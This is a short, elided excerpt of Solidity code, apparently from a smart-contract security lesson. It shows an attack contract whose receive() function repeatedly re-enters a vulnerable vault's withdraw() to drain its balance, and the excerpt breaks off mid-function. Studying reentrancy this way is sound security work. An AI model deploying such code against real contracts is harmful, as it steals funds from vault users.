...
contract ReentranceAttackContract2 {
    IVault public immutable vulnerableVault;
    address public owner;
    uint reentrancesTimes;
    uint reentrancesLimit;
    ...
    receive() external payable {
      if(msg.sender == address(vulnerableVault) ){
        if (address(vulnerableVault).balance > 0 && reentrancesTimes <= reentrancesLimit) {
            console.log("reentering...",reentrancesTimes);
            reentrancesTimes++;
            vulnerableVault.withdraw();
        } else {
